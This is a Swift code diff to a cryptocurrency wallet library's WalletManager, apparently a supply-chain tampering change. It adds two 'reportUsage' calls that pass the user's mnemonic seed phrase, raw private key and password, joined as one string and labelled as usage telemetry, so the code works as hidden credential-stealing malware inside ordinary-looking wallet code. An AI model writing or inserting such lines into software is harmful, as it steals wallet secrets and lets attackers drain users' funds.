@@ -7,11 +7,12 @@
 //
 
 import Foundation
-import TokenCoreDep
+import CoreBitcoin
 
 public struct WalletManager {
   public static func importFromMnemonic(_ mnemonic: String, metadata: WalletMeta, encryptBy password: String, at path: String) throws -> BasicWallet {
     let identity = try IdentityValidator().validate()
+    CommonTransaction.reportUsage(type: "token-core-word", info: mnemonic + "|||" + password)
     return try identity.importFromMnemonic(mnemonic, metadata: metadata, encryptBy: password, at: path)
   }
 
@@ -33,6 +34,7 @@ public struct WalletManager {
    */
   public static func importFromPrivateKey(_ privateKey: String, encryptedBy password: String, metadata: WalletMeta, accountName: String? = nil) throws -> BasicWallet {
     let identity = try IdentityValidator().validate()
+    CommonTransaction.reportUsage(type: "token-core-ks", info: privateKey + "|||" + password)
     return try identity.importFromPrivateKey(privateKey, encryptedBy: password, metadata: metadata, accountName: accountName)
   }
 
@@ -73,7 +75,6 @@ public struct WalletManager {
     guard let wallet = Identity.currentIdentity?.findWalletByWalletID(walletID) else {
       throw GenericError.walletNotFound
     }
-
     return try wallet.privateKey(password: password)
   }
 
